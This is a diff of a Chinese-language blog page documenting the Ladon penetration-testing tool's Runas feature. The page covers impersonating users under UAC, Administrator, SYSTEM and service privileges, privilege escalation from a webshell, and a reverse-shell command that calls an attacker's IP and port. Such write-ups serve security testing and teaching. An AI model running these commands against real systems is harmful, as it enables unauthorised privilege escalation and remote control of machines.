@@ -178,13 +178,13 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h3 id="Uac权限"><a href="#Uac权限" class="headerlink" title="Uac权限"></a>Uac权限</h3><p>非内置管理员用户在UAC权限下执行命令继承UAC权限，无法通过该用户权限添加用户<br>但是模拟内置管理员Administrator权限则不受UAC影响，可以通过该权限添加用户。</p>
 <p>Ladon Runas k8gege k8gege520 whoami<br>Ladon Runas Administrator k8gege520 whoami</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasUac.PNG"></p>
-<h3 id="Administrator权限"><a href="#Administrator权限" class="headerlink" title="Administrator权限"></a>Administrator权限</h3><p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
+<h3 id="Admin权限"><a href="#Admin权限" class="headerlink" title="Admin权限"></a>Admin权限</h3><p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
 <h3 id="System权限"><a href="#System权限" class="headerlink" title="System权限"></a>System权限</h3><p>SYSTEM权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
 <h3 id="Service权限"><a href="#Service权限" class="headerlink" title="Service权限"></a>Service权限</h3><p>服务权限下模拟登陆自己添加的管理员用户执行CMD命令<br>Ladon Runas k8gege k8gege520 whoami</p>
 <p>PS：实战某台机器曾经提权至管理员，由于提权不稳定曾给其添加了一个用户，发现再次使用Potato依旧无法以高极限执行命令，突然想起之前已加入一个管理员用户，使用非交互式Runas执行命令提权（已有目标帐密在低权限webshell下以高权限用户执行命令同理）</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/lpe/runas_lpe_2003.png"></p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/exp/lpe/runas_lpe_2003.png"></p>
 <h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>版本Ladon&gt;=7.8<br>LadonGUI–Netcat监听,执行以下命令即可以指定用户权限反弹shell<br>Ladon RunasCS user pass cmd.exe ip port<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p>
 <h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在UAC下需要模拟管理员权限执行命令，先过UAC或使用内置管理员<br>管理员或SYSTEM权限模拟的用户具备什么权限，它就有对应的权限</p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
